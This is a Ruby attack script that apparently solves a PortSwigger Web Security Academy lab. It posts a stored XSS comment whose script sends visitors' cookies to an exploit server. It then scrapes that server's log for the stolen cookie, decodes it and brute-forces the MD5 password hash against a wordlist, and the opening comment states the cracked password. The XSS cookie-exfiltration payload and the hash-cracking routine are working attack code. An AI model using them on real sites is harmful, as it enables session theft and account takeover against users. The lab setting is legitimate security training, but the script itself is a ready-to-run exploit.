# Password is `onceuponatime` it is not present in the portswigger's wordlist, so add this and run
require 'http'
require 'nokogiri'
require 'Digest'
require 'Base64'

url='https://0abc00880333c90581ab1bb300e6008a.web-security-academy.net/post/comment'

# Post xss payload to the comment section
# raw body -> postId=8&comment=comment&name=name&email=email%40email.com&website=https%3A%2F%2Fwww.google.com

puts 'Posting Comment...'
client = HTTP.post(url,:form => {
				:postId=>"7",
				:comment=>"<script>document.location='https://exploit-0a87000c0366c9e781b01a8701880024.exploit-server.net/exploit'+document.cookie</script>",
				:name=>"test",
				:email=>"a@b.com",
				:website=>"https://127.0.0.1",
})

# access the exploit server to access logs
cookie=''
cli1 = HTTP.get("https://exploit-0a87000c0366c9e781b01a8701880024.exploit-server.net/log")
temp = Nokogiri.parse cli1.body.to_s
temp.search(:css,'pre.container').text.split("\n").each { |d| cookie=d.split('=')[2].split()[0] if d.include? 'exploitsecret'}
puts cookie

# Print it
cookie =  Base64.decode64(cookie)
hash = cookie.split(':')[1]

# Bruteforce the hash
fh = File.new 'passwd.txt','r'
wl = fh.readlines
fh.close

wl.count.times do |w|
	pwh = Digest::MD5.hexdigest(wl[w].chomp)
	if pwh==hash
		puts pwh	
		puts "Password is #{wl[w].chomp}"
		break
	end
end
